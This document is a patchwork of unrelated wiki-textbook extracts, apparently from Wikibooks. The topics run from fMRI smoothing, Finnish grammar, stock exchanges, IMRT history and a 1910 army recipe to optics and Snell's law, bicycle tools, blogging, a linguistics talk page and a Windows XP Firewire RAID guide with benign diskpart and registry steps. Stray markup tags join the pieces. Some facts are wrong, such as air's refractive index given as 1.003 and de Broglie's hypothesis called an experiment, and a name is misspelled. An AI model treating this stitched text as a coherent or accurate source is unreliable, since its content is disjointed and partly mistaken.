The purpose of spatial smoothing is to cope with functional anatomical variability that is not compensated by spatial normalization (&quot;warping&quot;) and to improve the signal to noise ratio. In other words: smoothing increases statistical power. The less one smoothes, the less likely it is to obtain significant results. Understanding the exact impact of spatial smoothing on statistical power is not trivial: smoothing not only increases the signal to noise ratio of each voxel, it also reduces the number of resolution elements (&quot;resels&quot;) that are assumed to be independent and used for correction of multiple testing. With respect to the signal to noise ratio, it is being argued that an ideal filter kernel matches the size of the signal to detect [1]. After all, the level of smoothing that is optimal for real, measured data can only be determined empirically [2] and it may make sense to reanalyze the same data with several levels of smoothing [3].

The drawback from smoothing is a loss of spatial precision. Especially when using larger smoothing kernels (and when separately estimating the local variance for each smoothed voxel, which has been the standard in SPM, including SPM2, [4]), one should keep in mind that the loss of spatial precision is more dramatic in the resulting t-map than in the images itself due to nonlinear effects on the voxel variances [5]. In the worst case, the maximum t-value may be located in an area with no signal at all (e.g. white matter).

----
Now we are going to learn how to ask what someone's name is and ask what your name is. We are also looking on how to say your nationality, but first you need to know how to say the verb “to be”.

== Olla – to be == 

{| border=&quot;1&quot; cellpadding=&quot;2&quot;
|+ '''olla''' - to be
|-
! !!Finnish !! English !! Finnish !! English  
|-
! 1st person
|'''(minä) olen''' || I am &lt;sup&gt; 1 &lt;/sup&gt; || '''(me) olemme''' || we are 
|-
! 2nd person
|'''(sinä) olet''' || you are &lt;sup&gt; 1 &lt;/sup&gt; || '''(te) olette''' || you are &lt;sup&gt; 3 &lt;/sup&gt;
|-
! 3rd person
|'''hän on''' || he/she is &lt;sup&gt; 2 &lt;/sup&gt; || '''he ovat''' || they (persons) are
|-
! It
|'''se on''' || it is || '''ne ovat''' || they (non-persons) are
|}


# '''“Minä”''' and '''“sinä”''' are '''“mä”''' and '''“sä”''' in the common Finnish slang.
# '''“Hän”''' means 'he' or 'she', there's no distinction.
# '''&quot;Te olette&quot;''' can also be used when being polite, to only one person. This polite form is sometimes used to people who you are not acquainted with. This is similar to the French ''vous'' and the German ''Sie'', although it is used more rarely.

In Finnish, '''minä''', '''sinä''', '''me''' and '''te''' are usually not used, as the verb form shows the person and number in question. If they are used, it is usually to emphasize the subject in the sentence.

== Name ==

'''Mikä on  nimesi?''' – What is your name?

'''Mikä on teidän nimenne?''' – What is your name? (more polite)

'''Nimeni on...''' – My name is...

'''Olen...''' – I am...

=== Example Dialog Number One ===

Pekka is meeting someone.

* ''Pekka:'' '''Hei, mikä on nimesi?'''
* ''Päivi:'' '''Terve. Nimeni on Päivi.'''
* ''Pekka:'' '''Olen Pekka.'''

=== Example Dialog Number Two ===

Mr. Virtanen is meeting a new client.

* ''Herra Virtanen:'' '''Hyvää huomenta, mikä on teidän nimenne?'''
* ''Herra Hämäläinen:'' '''Hyvää päivää, nimeni on Hämäläinen. Mitä kuuluu?'''
* ''Herra Virtanen:'' '''Kiitos, hyvää, herra Hämäläinen.'''

== Nationality ==

We are now going to learn how to say your nationality. You say I am '''“Olen...”''' then the country, say England, '''“englanti”''' and a stem '''-lainen''' or '''-läinen”'''. So ''I am English'' is '''“Olen englantilainen”'''. It works for an another country '''“Olen ranskalainen”''', “I am French”. To ask for someone's nationality, say:

'''Mikä on kansallisuutesi?''' – What is your nationality?

'''Mikä on kansalaisuutenne?''' – What is your nationality? (more polite)


'''Olen...''' – I am ...

'''yhdysvalta''lainen''''' – from United States

'''amerikka''lainen''''' – American

'''englanti''lainen''''' – English

'''skotlanti''lainen''''' – Scottish

'''walesi''lainen''''' – Welsh. Note that the word Wales ends in a consonant. An i is added between &quot;wales&quot; and &quot;lainen&quot; to make it flow better.

'''pohjoisirlanti''lainen''''' – Northern Irish

'''irlanti''lainen''''' – Irish

'''eteläafrikka''lainen''''' – South African

'''kanada''lainen''''' – Canadian

'''australia''lainen''''' – Australian

'''uusiseelanti''lainen''''' – New Zealander

'''hollanti''lainen''''' - Dutch

'''suomalainen''' – Finnish ('''Suomi''' - Finland)

'''ruotsalainen''' - Swedish ('''Ruotsi''' - Sweden)

'''venäläinen''' - Russian ('''Venäjä''' - Russia)

However, there are some exceptions to the rule:

'''brittiläinen''' or '''britti''' – British, because the word for Britain is '''Iso-Britannia'''.

The way of Olen... -lainen/-läinen exists even in cities and areas, so '''Olen helsinkiläinen''' is “I am a Helsinkian”, or '''''Olen newyorkilainen''''' &quot;I am a New Yorker&quot;.

Note that although countries, cities and other definite areas are written with a capital letter in Finnish too, '''all''' nationalities are written with a small letter.

=== Exercise Number Two ===

These people are saying where are they from. Can you figure out the cities they are from? Beware, for some of them are quite difficult.

''Tip: They are all capital cities.''

Answers are on the Answer pages at the back of the book.

# '''Olen lontoolainen.'''
# '''Olen pariisilainen.'''
# '''Olen tokiolainen.'''
# '''Olen berliiniläinen.''' 
# '''Olen kööpenhaminalainen.'''
# '''Olen riikalainen.'''
# '''Olen pekingiläinen.'''
# '''Olen kapkaupunkilainen.'''
# '''Olen ateenalainen.'''
# '''Olen tukholmalainen.'''

'''stock exchange'''   

organized market for the trading of stocks and bonds (see bond ; stock ). Such markets were originally open to all, but at present only members of the owning association may buy and sell directly. Members, or stock brokers , buy and sell for themselves or for others, charging commissions for their services. A stock may be bought or sold only if it is listed on an exchange, and it may not be listed unless it meets certain requirements set by the exchange's board of governors. There are stock exchanges in all important financial centers of the world; the New York Stock Exchange (NYSE, in nearly continuous operation since 1792), which had a trading volume of $7.3 trillion in 1998, is the largest in the world. Tokyo, London, and Frankfurt also have major facilities, and Euronext, an inter-European exchange combining facilities in Amsterdam, Brussels, Paris, and other cities, is also significant.     By providing a centralized, ready market for the exchange of securities, stock exchanges greatly facilitate the financing of business through flotation of stocks and bonds. However, speculation in stocks can sometimes accentuate the instability of an economy. The reality of the Great Depression was emphasized by the stock market crash in 1929. The interstate sale of securities and certain stock exchange practices in the United States are regulated by federal laws administered by the Securities and Exchange Commission . Today, a large percentage of stocks are traded through such over-the-counter organizations as Nasdaq (National Association of Securities Dealers Automatic Quotations) and its European equivalent, Nasdaq Europe (formerly Easdaq). Through these organizations, many securities not listed on a major stock exchange may be traded by dealers using computer and telecommunications technology; in 1994, Nasdaq, on which many computer and other high-technology stocks are traded, surpassed the NYSE in annual share volume. After the deregulation of the British securities market in 1986, the London Stock Exchange saw a decline in business due to a new computerized market similar to Nasdaq. 

Computer-driven trade has significantly affected the stock exchange. Computer and telecommunications technology, besides opening a wide market in over the counter dealings, has also given rise to trading on an international level. Personal computers and modems allow trading to occur around the clock (after-hours NYSE and Nasdaq trading began in 1999), and the securities trading on one major stock exchange can now significantly affect the trading on others. Many contend that the traditional manner of trading will eventually become obsolete. Technology also now allows for “day trading,” a high-risk business in which numerous computerized trades are made during a single day, with large gains (and large losses) possible.

Animation is the process of creating moving images from a series of still images.  In film making, this can be used to create a shot or sequence that cannot be shot on camera.

There are many techniques that can be used, including drawings, photos ([[w:Pixilation|pixilation]]), 3D (model or puppet), and 2D and 3D computer animation.

Animations can be produced on film or as a movie file or still image sequence. Still images - created at high resolution and uncompressed (or with lossless compression) are often prefered as they give flexibilty and high image quality.  In an NLE (Non Linear Editor) a still image sequence can usually be imported as a group, and edited into the film, with the option of adjusting the indivdual frames.

In modern film making, 3D computer animation (CGI) is most often used as it can come close to matching the look of the rest of the film, while offering great flexibility.

Animation is by nature a slow and highly skilled process, but the tools are readily available, for example there are low cost or free trial versions of many animation software packages (expect a steep learning curve).

This section is about how IMRT works (in brief) and the history of IMRT.  More technical aspects of IMRT should be placed in the section [[Radiation Oncology/IMRT/IMRT Technical|Radiation Oncology:IMRT Technical]].  Clinical results of IMRT should be placed elsewhere.

==History==
===Timeline of IMRT===
*1992 - 1994 - proprietary IMRT development at NOMOS (initially named VISUS Medical Devices, then Cognos*centi, then NOMOS)
*1994 - NOMOS PEACOCK system (first patient treated in 1994 at The Methodist Hospital, Houston, TX, USA)
*1996 - First IMRT treatment with a conventional linac equipped with a multileaf collimator (MLC)

===NOMOS PEACOCK===
The introduction of a commercial IMRT system into popular use began with the PEACOCK system produced by the NOMOS Corporation (Pennsylvania, USA).  The PEACOCK system consists of the MIMiC, which is a &quot;bolt-on&quot; multileaf collimator, and a dedicated treatment planning system.  Treatment with the PEACOCK is described as &quot;serial tomotherapy&quot; in which the treatment is delivered using non-overlapping arcs (thus &quot;tomo&quot; or slice therapy) with couch movement occurring between each arc (thus &quot;serial&quot;).

==Guidelines==
Guidelines for the implementation and quality assurance for IMRT.

'''Chipped beef on toast''' is slivers of meat in a creamy [[Cookbook:Sauce|sauce]],  served on [[Cookbook:Toast|toasted bread]]. In military slang it is commonly referred to as &quot;Shit On a Shingle&quot; (SOS). [[w:Chipped Beef|Chipped beef]] is a dried, smoked, and salted meat product, generally sold wadded up in jars or flat in plastic packets.

The 1910 edition of the ''Manual for Army Cooks'' provides the following recipe, for a quantity sufficient for 60 men.

This recipe left out an important step---soaking the beef to reduce the salt content.  Later recipes were creamier.  See http://www.seabeecook.com/cookery/cooking/cooking_sos.htm

==Ingredients==

*15 [[Cookbook:Pound|pounds]] (6.8[[Cookbook:Kg|kg]]) chipped beef
*1 1/2 pound (680[[Cookbook:Gram|g]]) of [[Cookbook:Fat|fat]], [[Cookbook:Butter|butter]] preferred
*1¼ [[Cookbook:Pound|lbs]] (560g) of [[Cookbook:Flour|flour]]
*2 12-oz cans of [[Cookbook:Condensed milk|evaporated milk]]
*1 bunch [[Cookbook:Parsley|parsley]]
*¼ [[Cookbook:Ounce|oz]] (7g) [[Cookbook:Pepper|pepper]]
*6 [[Cookbook:Quart|quarts]] (6[[Cookbook:Liter|l]]) [[Cookbook:Beef|beef]] [[Cookbook:Stock|stock]]

==Procedure==

# Brown the flour in the melted fat. 
# Dissolve the milk in the beef stock, and then add that to the pot. 
# Stir this together slowly to prevent lumping, and then add the beef. 
# Cook for a few minutes, add the parsley, and serve over toast.

== Open Systems == 
A system that interfaces and interacts with its environment, by receiving inputs from and delivering outputs to the outside, is called an open system. They possess permeable boundaries, that permits interaction across its boundary, through which new information or ideas are readily absorbed, permitting the incorporation  and diffusion of viable, new ideas. Because of this they can adapt more quickly to changes in the external environment in which they operate. As the environment influence the system, the system also influences the environment. Allowing a system to be open ultimately sustains growth and serves its parent environment, and so both have a stronger probability for survival.

Examples of open systems: Business organization, Hospital system, College or University system.

Conversely, a closed system is more prone to resist incorporating new ideas, that can be deemed unnecessary to its parent environment and risks atrophy. By not adopting or imps, a closed system ceases to properly serve the environment it lives in.

== Adaptability and Survival ==

This adaptability and survival of open systems has been exhibited in society's recent global information age.  
Current information technology have absorbed new technologies and approaches have sustained long term success. Systems which incorporate efficient data representation, storage, and transfer, and good operating system design and effective use of processor power have retained their public user base. Information technology initiatives which adapted slowly to their rapidly changing environment ultimately lost significance in the industry and have disappeared.Operating technologies such as the [[Wiktionary:Network File System|Network File System]], initiated by [[Wiktionary:Sun Microsystems|Sun Microsystems]], and [[Wiktionary:Netscape|Netscape]] Internet Browser, designed by [[Wiktionary:Marc Andeerson|Marc Andeerson]], are examples of effective open IT systems. These technologies have established the backbone of information technology within society. Both technologies represent open systems with the common initiative for sharing data. [[Wiktionary:NFS|NFS]] is used to distribute access to shared [[Wiktionary:disk file system|disk file system]] across several servers within a local network. [[Wiktionary:Netscape|Netscape]] is used as a portal to gain access to the volumes of data within the world’s [[Wiktionary:Internet|Internet]]. Both technologies fostered further growth within the environments in which they were introduced. The NFS standard created synergy for the growth of SUN Microsystems and has been  adopted by other operating system designers. Netscape ultimately fostered the growth of the amount and types of data made available through the Internet. These technologies foster an open paradigm where data is absorbed by an infinite number of participants.

== Increase Chances ==

The rate of change within the technology sector is extremely rapid, and systems groups have consciously adopted an “open systems” approach to increase their chance of survival. Prioritizing the adaptability of a system for different OS platforms, database designs, and communication protocols has been seen within the IT industry as the wisest approach. Any technologies designed to solely propagate the success of one platform or particular technology have been methodically eliminated. At the risk of domination of the user’s personal computer desktop, [[Wiktionary:Microsoft|Microsoft's]] introduction of a closed design embedding the company’s internet browser into kernel operating modules was halted by an investigation of [[Wiktionary:business monopoly|monopolistic practices]]. The initiative of [[Wiktionary:Microsoft|Microsoft]] to manipulate technology such that the primary benefits were for the propagation of their technical product alone was halted by the natural tensions created by the unhealthy closed system. The system did not serve the environment in which it lived by posing the threat of limiting user’s access to the world’s internet. Outcry from users as well as judicial entities has forced Microsoft to evolve it's operating system into a more accommodating, dynamic and viable system.</text>

      <text xml:space="preserve">== What is light ==

'''Light''' is electromagnetic radiation with a wavelength that is visible to the eye, or in a more general sense, any electromagnetic radiation in the range from infrared to ultraviolet.  The three basic dimensions of light (and of all electromagnetic radiation) are:
* intensity (or brilliance or amplitude, perceived by humans as the brightness of the light),
* frequency (or wavelength, perceived by humans as the color of the light), and
* polarization (or angle of vibration and not perceivable by humans under ordinary circumstances)
Due to wave-particle duality, light simultaneously exhibits properties of both waves and particles.

=== Wave-particle duality ===
The modern theory that explains the nature of light is wave-particle duality, described by Albert Einstein in the early 1900s, based on his work on the photoelectric effect and Planck's results.  Einstein determined that the energy of a photon is proportional to its frequency.  More generally, the theory states that everything has both a particle nature, and a wave nature, and various experiments can be done to bring out one or the other.  The particle nature is more easily discerned if an object has a large mass, so it took until an experiment by Louis de Broglie in 1924 to realise that electrons also exhibited wave-particle duality.  Einstein received the Nobel Prize in 1921 for his work with the wave-particle duality on photons, and de Broglie followed in 1929 for his extension to other particles.

===Color and wavelengths===
The different wavelengths are detected by the human eye and then interpreted by the human brain as colors, ranging from red at the longest wavelengths (lowest frequencies) to violet at the shortest wavelengths (highest frequencies). The intervening frequencies are seen as orange, yellow, green, blue, and, conventionally, indigo.

The wavelengths of the electromagnetic spectrum immediately outside the range that the human eye is able to see/detect are called ''ultraviolet'' (UV) at the short wavelength (high frequency) end and ''infrared'' (IR) at the long wavelength (low frequency) end.  Although humans cannot see IR, we do perceive the near IR (shorter wavelength, higher frequency, higher energy) as heat through receptors in the skin. Cameras that can detect IR and convert it to light are called night-vision cameras.  

UV radiation is not perceived by humans at all except in a very delayed fashion, as overexposure of the skin to UV light causes sunburn, or skin cancer. Some animals, such as bees, can see UV radiation while others, such as pit viper snakes, can see IR using pits in their heads.

== Ray Approximation of Light ==
When studying refraction, mirrors and lenses we ignore the wave properties of light.

=== What is a ray of light? ===
Light acts as both a wave and a ray of particles. When observing the effects of light on large object such as cubes of glass, mirrors and lenses light can be observed to act like a ray of tiny little particles that can be bounced, directed or slowed.

Mediums slow light down -- lawn mower analogy

Mirrors bounce light -- converging mirrors, diverging mirrors 

Lens direct light -- converging lenes, diverging mirror lenes

=== Reflection and Refraction ===
[[File:Perspex Refraction.jpg|thumb|250px|Refraction in a perspex block.]]
[[Image:Refraction in a ripple tank.svg|frame|right|Water waves refracting in a ripple tank.]]'''Refraction''' is the change in direction of a wave due to a change in velocity. It happens when waves travel from a medium with a given refractive index to a medium with another. At the boundary between the media the wave changes direction; its wavelength increases or decreases but frequency remains constant. For example, a light ray will refract as it passes through glass; understanding of this concept led to the invention of the refracting telescope. 

In the diagram on the right, ripples travel from the left and pass over a shallower region inclined at an angle to the wavefront. The waves travel more slowly in the shallower water, so the wavelength decreases and the wave bends at the boundary. The dotted line represents the normal to the boundary. The dashed line represents the original direction of the waves. The phenomenon explains why waves on a shoreline never hit the shoreline at an angle. Whichever direction the waves travel in deep water, they always refract towards the normal as they enter the shallower water near the beach.

An example of this is looking into a bowl of water. Air has a refractive index of about 1.003, and water has a refractive index of about 1.33. If you look at a straight object, such as a pencil, which is placed at a slant, partially in the water, the object appears to bend at the water's surface. This is due to the light rays from the object being bent as they move from the water to the air. This causes water to appear shallower than it really is.

[[Image:Pencil in a bowl of water.png|left|frame|Refraction of light waves in water.]]

In the diagram, the dark rectangle represents the actual position of a pencil sitting in a bowl of water. The light rectangle represents the apparent position of the pencil. Notice that the end (X) looks like it is at (Y), a position that is considerably shallower than (X).

Refraction is also responsible for rainbows and for splitting up of white light into a rainbow-spectrum as it passes through a glass prism. Glass has a higher refractive index than air and the different frequencies of light travel at different speeds (dispersion), causing them to be refracted at different angles. The different frequencies correspond to different colours observed.

The amount that the light bends during '''refraction''' is calculated using Snell's law.

Recently some metamaterials have been created which have a negative refractive index.

==== f=f ====
Frequency is fundamental 

The speed of light doesn't ever change.

The frequency and wavelength (&amp;lambda;) of light can change.

[[Image:Sine waves different frequencies.png|thumb|right|360px|Sine waves of various frequencies; the lower waves have higher frequencies than those above.]]
'''Frequency''' is the measurement of the number of times that a repeated event occurs per unit time. To calculate the frequency, one fixes a time interval, counts the number of occurrences of the event within that interval, and then divides this count by the length of the time interval. 

In SI units, the result is measured in hertz (Hz) after the German physicist, Heinrich Rudolf Hertz. 1 Hz means that an event repeats once per second. Other units that have been used to measure frequency include: cycles per second, revolutions per minute (rpm). 

=====Frequency of waves=====
Measuring the frequency of  electromagnetic waves (such as light) the frequency in hertz is the number of cycles of the repetitive waveform per second. If the wave is a sound, frequency is what characterizes its pitch

Frequency has an inverse relationship to the concept of wavelength. The frequency ''f'' is equal to the speed ''v'' of the wave divided by the wavelength &amp;lambda; (lambda) of the wave:

:&lt;math&gt;f = \frac{v}{\lambda}&lt;/math&gt;

In the special case of electromagnetic waves moving through a vacuum, then '''v = c''', where '''c''' is the speed of light in a vacuum, and this expression becomes:

:&lt;math&gt;f = \frac{c}{\lambda}&lt;/math&gt;

'''NOTE:''' Remember f=f When waves travel from one medium to another, their frequency remains more or less the same - only their wavelength changes.

==== Lawn mower analogy ====
To understand how light moves through a medium, such as glass, you can use the analogy of a person riding a self-powered lawnmower.

When the person is on the grass they slip and move slow. When they hit the pavement they stop slipping and speed up. The lawnmower moving over the grass is analogous to light moving through a medium, such as glass and the lawn mower moving over pavement is analogous to light moving through vacuum.

Furthermore when the lawn mower moves over the pavement and hits the grass at an angle one of the lawnmower's front wheel will hit the grass and slow down for a brief period while the other front wheel is going the same speed. This changes direction of the lawn mower. Much like a ray of light moving from vacuum to a medium such as glass changes direction when it hits the medium. The light ray bends towards the perpendicular.

==== Snell's Law ====
'''Snell's law''' is the simple formula used to calculate the refraction of light when travelling between two media of differing refractive index. It is named for its discoverer, Dutch mathematician Willebrord van Roijen Snell (1580-1626).

===== Overview =====
[[Image:Snell1.png|thumb|300px|Refraction of light at the interface between two media of different refractive indices]]

In the diagram on the right, two media of refractive indices ''n''&lt;sub&gt;1&lt;/sub&gt; (on the left) and ''n''&lt;sub&gt;2&lt;/sub&gt; (on the right) meet at a surface or interface (vertical line). ''n''&lt;sub&gt;2&lt;/sub&gt; &gt;  ''n''&lt;sub&gt;1&lt;/sub&gt;, and light has a slower phase velocity within the second medium.

A light ray '''PO''' in the leftmost medium strikes the interface at the point '''O'''. From point '''O''', we project a straight line at right angles to the line of the interface; this is known as the normal to the surface (horizontal line). The angle between the normal and the light ray '''PO''' is known as the ''angle of incidence'', &amp;theta;&lt;sub&gt;1&lt;/sub&gt;.

The ray continues through the interface into the medium on the right; this is shown as the ray '''OQ'''. The angle with which is makes to the normal is known of as the ''angle of refraction'', &amp;theta;&lt;sub&gt;2&lt;/sub&gt;.

Snell's law gives the relation between the angles &amp;theta;&lt;sub&gt;1&lt;/sub&gt; and &amp;theta;&lt;sub&gt;2&lt;/sub&gt;:

:&lt;math&gt;n_1\sin(\theta_1) = n_2\sin(\theta_2)\, &lt;/math&gt;

Note that, for the case of &amp;theta;&lt;sub&gt;1&lt;/sub&gt; = 0&amp;deg; (i.e., a ray perpendicular to the interface) the solution is  &amp;theta;&lt;sub&gt;2&lt;/sub&gt; = 0&amp;deg; regardless of the values of ''n''&lt;sub&gt;1&lt;/sub&gt; and ''n''&lt;sub&gt;2&lt;/sub&gt;. In other words, a ray entering a medium perpendicular to the surface is never bent.

The above is also valid for light going from a dense to a less dense medium; the symmetry of Snell's law shows that the same raypaths are applicable in opposite direction.

A qualitative rule for determining the direction of refraction is that the ray in the denser medium is always closer to the normal. A handy way to remember this is to visualize the ray as a car crossing the boundary between asphalt (the less dense medium) and mud (the denser medium). Depending on the angle, either the left wheel or the right wheel of the car will cross into the new medium first, causing the car to swerve.

===== Total internal reflection =====
When moving from a dense to a less dense medium (i.e. ''n''&lt;sub&gt;1&lt;/sub&gt; &amp;gt; ''n''&lt;sub&gt;2&lt;/sub&gt;), it is easily verified that the above equation has no solution when &amp;theta;&lt;sub&gt;1&lt;/sub&gt; exceeds a value known as the '''''critical angle''''':

:&lt;math&gt;\theta_{\mathrm{crit}} = \sin^{-1}\left( \frac{n_2}{n_1} \right)&lt;/math&gt;

When &amp;theta;&lt;sub&gt;1&lt;/sub&gt; &amp;gt; &amp;theta;&lt;sub&gt;crit&lt;/sub&gt;, no refracted ray appears, and the incident ray undergoes total internal reflection from the interface.

Given a normalized ray vector '''v''' and a normalized plane normal vector '''p''', one can work out the normalized reflected and refracted rays: (note that the actual angles &amp;theta;&lt;sub&gt;1&lt;/sub&gt; and &amp;theta;&lt;sub&gt;2&lt;/sub&gt; are not worked out)

:&lt;math&gt;\cos\theta_1=\mathbf{v}\cdot\mathbf{p}&lt;/math&gt;
:&lt;math&gt;\cos\theta_2=\sqrt{1-\left(\frac{n_1}{n_2}\right)^2\left(1-\left(\cos\theta_1\right)^2\right)}&lt;/math&gt;
:&lt;math&gt;\mathbf{v}_{\mathrm{reflect}}=\mathbf{v}-\left(2\cos\theta_1\right)\mathbf{p}&lt;/math&gt;
:&lt;math&gt;\mathbf{v}_{\mathrm{refract}}=\left(\frac{n_1}{n_2}\right)\mathbf{v}+\left(\cos\theta_2-\frac{n_1}{n_2}\cos\theta_1\right)\mathbf{p}&lt;/math&gt;

The cosines may be recycled and used in the Fresnel equations for working out the intensity of the resulting rays. The square root turns imaginary during total internal reflection, and the refracted ray is not real (there is apparently some kind of refracted ray, which decays very quickly, exponentially with distance).

===== Derivation =====
Snell's law may be derived from Fermat's principle, which states that the light travels the path which takes the least time.  By taking the derivative of the optical path length, the stationary point is found giving the path taken by the light. In a classic analogy by Feynman, the area of lower refractive index is replaced by a beach, the area of higher refractive index by the sea, and the fastest way for a rescuer on the beach to get to a drowning person in the sea is to run along a path that follows Snell's law.

      <text xml:space="preserve">A '''bottom bracket tool''' is specifically designed to remove and insert the [[w:Bottom bracket|bottom bracket]] of a bicycle.

Bottom brackets are, unfortunately, one of the less standardised parts of a bicycle. Over the years manufacturers have come up with many different approaches to providing gripping surfaces for the bottom bracket to be inserted or removed. A typical repair shop will, correspondingly, have a variety of tools available for different styles of bottom bracket.

One of the older and more common systems uses the combination of a lock ring remover and a pin wrench.  the left bearing cone is removed in order for the bearings and axle to be removed.The bearing cone has two shallow holes drilled into it. When a pin wrench is inserted into these holes, the bearing cone can be threaded in or out.

The lock ring is a circular nut used to prevent the left bearing cone from loosening by accident. The lock ring remover is inserted into one of several notches in the lock ring in order for it to be removed.

      <text xml:space="preserve">Welcome to the Blogging 101 Wikibook. This book (which anybody can edit) is a collection of resources about blogs and blogging. It is divided into several categories. Please add whatever links you think would be useful to people under the appropriate headings. (Off-topic &amp; inappropriate material will of course be edited out.)&lt;br /&gt;


==Definitions==
&quot;A weblog, or simply a blog, is a web application which contains periodic, reverse chronologically ordered posts on a common webpage. Such a Web site would typically be accessible to any Internet user. Part of the reason &quot;blog&quot; was coined and commonly accepted into use is the fact that in saying &quot;blog,&quot; confusion with server log is avoided.

Blogs run from individual diaries to arms of political campaigns, media programs and corporations, and from one occasional author to having large communities of writers. The totality of weblogs or blog-related webs is usually called the blogosphere.

The format of weblogs can vary from simple bullet lists of hyperlinks to article summaries with user-provided comments and ratings. Individual weblog entries are almost always date and time-stamped, with the newest post at the top of the page. Because links are so important to weblogs, most blogs have a way of archiving older entries and generating a static address for individual entries; this static link is referred to as a permalink. The latest headlines, with hyperlinks and summaries, are offered in weblogs in the RSS XML-format, to be read with a RSS feedreader.

A weblog is often run through a Content management system or CMS.&quot;

[BlogPolicies?] How To Create Blog Policies for your Site, and Why -- Your blog policy can cover how you'll handle corrections, troll comments, attribution, and whether or not content on your blog can be used/remixed by others.  Why have one?  Better to have a policy and apply it when the time comes than have a problem and make up something to deal with it retroactively.  Policies can also give you and your readers a strong idea of what your blog is about and why you're blogging.

==Aggregators and Newsreaders==

An aggregator enables you to skim lots of blogs by pulling together summaries of the new entries.

The summaries are actually RSS feeds. An RSS feed is a little file your blogging software probably creates automatically that contains either the first few lines of a blog entry or the entire thing, depending on how you've set it up. An aggregator goes to the blogs you tell it to and lists all the new entries. It does this by reading the RSS feed.

      <text xml:space="preserve">==How to find and evaluate blog networks==

As of April 2006, there are dozens of blog networks on the Web.  All of them have unique ways of paying their bloggers and arranging the ownership of the blog content.  For example, some blog networks pay each blogger a percentage of the gross revenue for that blogger's blog(s) and allow the blogger to retain full ownership of her content, while others pay a flat rate for each post and thus buy content rights from the blogger.

BlogNetworkList.com, run by the Blogmedia blog network, offers various ways of evaluating and comparing blog networks, such as the number of incoming links to their sites from other blogs and from search engines.

==How to boost your traffic==

There are many ways to encourage traffic to your blog.  Beware of programs that promise traffic without promising targeted traffic.  If visitors come to your site without any interest in your topic, such as through a traffic exchange program, you are accomplishing little.

      <text xml:space="preserve">It is so great to see others contributing content here!  Come back and add more.

Eventually we will probably want to tone down statements like &quot;polysynthetic languages are definitely very cool&quot;, but for now I ''want'' to see that kind of enthusiasm here.  We can worry about serious scholarly tone when the book has a couple of hundred pages.  [[User:ACW|ACW]] 22:32, 25 Feb 2005 (UTC)

== Discourse?  Pragmatics?  Sociolinguistics?  Psycholinguistics? ==

If the aim here is a survey style text book then I think it needs to cover some more material.  I think that Discourse, Sociolinguistics and Psycholinguistics need their own sections and that Pragmatics could be dealt with under semantics.  Psycholinguistics might also cover first and second lanuage acquisition and speech and language pathology.  I haven't edited the book to add these section headings because I can't commit right now to contributing so it would be ill mannered.

== 3 small questions ==

1. is latin really the ultimate inflected language? aren't there lots of langs with more elaborated inflections?

2.question of audience: names some major languages in case you cant think of any but then says &quot;every argument ... is inflected on the verb,&quot; a mildly technical use of &quot;argument&quot;


3. lutinative languages can have both lots of agreements and inflections, or have rigid word order, such as German.

but german also has inflections.

== Syntatctic topology ==

It makes no sense.</text>

      <text xml:space="preserve">==Disclaimer== 
This may or may not be complete garbage. I have not completed and fully tested the RAID yet. 
'''The actions described here could damage your Oxford 911 enclosures, hard drives, Firewire controllers, motherboard, PC, maybe even burn your house down. ''Everything here is at your own risk!'' '''

I wanted to start a place to post information I've gathered and learned about how to build a software [[RAID]] using [[Windows XP]], Oxford 911 external [[firewire]] enclosures and a little free time.

==Why would you want to do this?==

* The RAID is easy to build
* Cost effective
* Huge, Reliable Storage
* Easy to expand (Sort of...)
* Save power since it doesn't require a dedicated server
* Works with laptops
* Long Firewire cables allow placing the RAID in a closet to reduce noise

==What applications should you use this for?==

If your cabling is not perfect and your drives disconnect and reconnect, device numbers may get reassigned. Windows XP may not handle this reassignment very well. If you're lucky your volume will become inaccessible and you will be able to power down, power up and continue working. If you are not so lucky, data may get written to the wrong location producing a corrupted file or a corrupted filesystem table. A corrupted filesystem in a dynamic disk can be very hard to recover (I have been successful in retrieving files using r-tools but many other disk recovery tools failed). Note that even if you use redundancy it could easily be several drives simultaneously with errors and make recovery not possible. 

External firewire raid is best suited for applications where the sustained high speed read/write bandwidth of RAID will be an important advantage but you can afford to occasionally lose your data. For example, if you are processing large video files where the original is in a safe location and at worst you lose your current editing session, the speed improvements could outweigh the occasional loss of data.

==Ingredients==
# Some cheap standard IDE drives. Lots of them. You'll fill them up later. 
#* How many drives? Any amount you want. With software RAID 5 it doesn’t matter. Your usable space will be x * ( y – 1) where x is the capacity of the smallest drive in the array and y is the number of drives. That’s right, one drive is used for parity. Well, not really, its distributed. But this isn’t a [[RAID]] tutorial. Look that stuff up on your own. Just get some drives.
# Windows XP 
#* Home or Professional or Windows 2003 Server
#* Windows 2000 may work
#* OS X is also reported to do similar things, but it is untested for this application.
# External Firewire enclosures or bridge boards. Make sure they use the Oxford 911 chipset.

''I think WindowsXP only puts &quot;dynamic&quot; drives into a RAID array. Does this work for external USB hard drives? Is it possible to make external USB drives &quot;dynamic&quot;?''

Windows XP requires dynamic disks for RAID. Basic drives can be converted to dynamic easily. However, Windows doesn't seem to allow basic to dynamic conversion on USB hard drives. There may be a registry hack for this, but I have not found it. One way to make it work might be to take the drive and put it into a PC or a firewire enclosure and convert it to a dynamic disk there. Then, return it to the USB enclosure. I believe Windows will recognize it and mount it.

As of Windows XP SP2 &amp; Windows 2003 Server SP2, dynamic disks cannot be converted from basic via USB. Also, attempting to convert a basic to dynamic (on one computer), and then moving it to another computer will not work. Only the computer making the convert to dynamic will be able to read the dynamic drive.


It is possible to convert a USB disk to a dynamic disk ( at least in 2003 server ) by using the command line diskpart command.

Using a command line
1. Open Command prompt.
2. Type: diskpart
3. At the DISKPART prompt, type: list disk

Make note of the disk number of the disk you want to convert to dynamic.

4. At the DISKPART prompt, type: select disk n
5. At the DISKPART prompt, type: convert dynamic

== Let's get down to work ==

# First step. Get Windows XP ready for RAID. Here are nice instructions which I will not repeat. &lt;br&gt; http://www.tomshardware.com/2004/11/19/using_windowsxp_to_make_raid_5_happen/ &lt;br&gt; Now you can create RAID volumes. However... 
# By default, Windows XP will not allow you to convert a FireWire-connected disk to a dynamic disk. However, you can make a simple registry change to accomplish such an upgrade. &lt;br&gt; To convert a FireWire-connected disk to a dynamic disk, perform the following steps:
## Start a registry editor (e.g., regedit.exe).
## Navigate to the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dmadmin\Parameters registry subkey.
## Double-click EnableDynamicConversionFor1394, set this value to 1, then click OK.
## Close the registry editor.
## Reboot the machine for the change to take effect. 
